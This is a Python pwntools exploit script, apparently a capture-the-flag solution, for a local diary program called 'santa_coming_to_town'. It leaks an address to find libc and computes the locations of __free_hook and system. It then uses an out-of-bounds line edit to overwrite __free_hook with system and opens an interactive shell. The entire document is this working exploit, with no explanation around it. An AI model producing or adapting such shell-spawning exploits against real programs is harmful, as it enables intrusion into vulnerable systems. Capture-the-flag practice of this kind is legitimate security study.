from pwn import *
import re

p = process('./santa_coming_to_town')
e = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
free_hook_offset = e.symbols['__free_hook']
system_offset = e.symbols['system']
binsh = b"/bin/sh\x00\x00"
libc_offset = 0x18a000 - 0x10
pattern = re.compile(b"Pages : (.*)\n")
def write_diary(date, lines, content):
	p.recvuntil(b">> ")
	p.sendline(b"1")
	p.recvuntil(b"What date is it? : ")
	p.sendline(date)
	p.recvuntil(b"How many lines will to write? (1 line = 16 words) : ")
	p.sendline(lines)
	p.recvuntil(b"~~~~~~~~~~contents~~~~~~~~~~\n")
	p.sendline(content)

def read_diary(date):
	p.recvuntil(b">> ")
	p.sendline(b"2")
	p.recvuntil(b"What date is it? : ")
	p.sendline(date)
	return p.recvuntil(b"Contents")

def parse_addr(sss):
	libc_base = bytearray.fromhex(pattern.search(sss).groups()[0][2:].decode())
	addr = int.from_bytes(libc_base.rjust(8, b'\x00'), byteorder="big")
	return addr

write_diary(b"25", b"100000", binsh)
libc_base = read_diary(b"25")
diary_one_addr = parse_addr(libc_base)
libc_base = diary_one_addr + libc_offset
free_hook_addr = libc_base + free_hook_offset
system_addr = libc_base + system_offset
print(f"libc_base: {hex(libc_base)}")
print(f"free_hook_addr: {hex(free_hook_addr)}")
print(f"system_addr: {hex(system_addr)}")
for i in range(1, 24+1, 1):
	write_diary(str(i).encode(), b"1", b"AAAAAAAA")
print("diary_one_addr", hex(diary_one_addr))
print("free_hook", hex(free_hook_addr))

overwrite_offset = ((free_hook_addr - diary_one_addr) // 16) + 1
print(f"overwrite_offset", hex(overwrite_offset))
p.recvuntil(b">> ")
p.sendline(b"3")
p.recvuntil(b"What date is it? : ")
p.sendline(b"25")
print(p.recvuntil(b"what line you edit : "))
print(str(overwrite_offset).encode())
p.sendline(str(overwrite_offset).encode())
p.recvuntil(b"Change memories to : ")
payload = p64(system_addr) * 2

print(payload)
p.sendline(payload)
p.interactive()

